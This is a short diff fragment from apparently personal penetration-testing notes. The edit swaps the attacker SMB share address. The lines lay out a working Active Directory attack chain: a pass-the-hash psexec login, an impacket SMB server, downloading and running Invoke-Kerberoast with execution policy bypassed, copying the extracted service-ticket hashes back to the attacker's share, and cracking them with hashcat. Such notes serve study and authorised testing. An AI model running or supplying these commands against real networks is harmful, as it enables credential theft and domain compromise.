@@ -355,11 +355,11 @@ Completely eliminating the need for Mimikatz in this attack.
 
 psexec administrator@192.168.200.5 -hashes aad3b4356:aad3b435
 python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support -username mike -password paxx  
-copy \\192.168.119.154\share\Invoke-Kerberoast.ps1  
+copy \\192.168.162.46\share\Invoke-Kerberoast.ps1  
 powershell.exe -nop -exec bypass  
 Import-Module .\Invoke-Kerberoast.ps1  
 Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII khash0.txt  
-copy khash0.txt \\192.168.119.154\share\  
+copy khash0.txt \\192.168.162.46\share\  
 hashcat -m 13100 -a 0 khash0.txt $rockyou --force    
 
 
